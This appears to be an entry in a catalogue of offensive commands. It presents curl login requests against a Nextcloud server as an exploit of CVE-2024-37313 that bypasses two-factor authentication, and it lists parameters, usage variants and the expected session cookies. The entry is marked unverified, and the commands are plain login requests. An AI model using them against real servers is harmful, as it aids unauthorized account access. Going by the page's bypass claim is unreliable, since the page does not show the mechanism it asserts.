---
data: >-
  curl -X POST 'https://target-nextcloud.com/login' -H 'Content-Type:
  application/x-www-form-urlencoded' -d 'user=username&password=pass123' -c
  cookies.txt
tags:
  - authentication
  - bypass
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 42cd33bc-8e01-4384-95ad-ce1eb414b448
created_at: '2025-12-14T17:29:44.526Z'
updated_at: '2025-12-14T17:29:44.526Z'
verified: false
validated: true
submitted: true
---
# curl-nextcloud-login-bypass

## Command

```bash
curl -X POST 'https://target-nextcloud.com/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'user=username&password=pass123' \
  -c cookies.txt
```

## Description

This command uses curl to submit a login request to a Nextcloud instance, exploiting CVE-2024-37313 to bypass 2FA by providing only primary credentials. It is used in scenarios where the authentication mechanism fails to enforce second factor checks, allowing unauthorized access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://target-nextcloud.com/login'` | The target login endpoint URL | Yes |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets the content type for form data | Yes |
| `-d 'user=username&password=pass123'` | Form data with username and password | Yes |
| `-c cookies.txt` | Saves session cookies to file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target-nextcloud.com/login' -H 'Content-Type: application/x-www-form-urlencoded' -d 'user=admin&password=secret' -c cookies.txt
```

### Advanced Usage

```bash
curl -X POST 'https://target-nextcloud.com/index.php/login' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0' -d 'user=admin&password=secret&requesttoken=tokenhere' -c cookies.txt -v
```

## Expected Output

A successful response (HTTP 200 or 302) with session cookies saved to cookies.txt, indicating login without 2FA prompt. Look for headers like `Set-Cookie: nc_session=...` or body content confirming authentication.

## Related

- [[Related Procedure]]
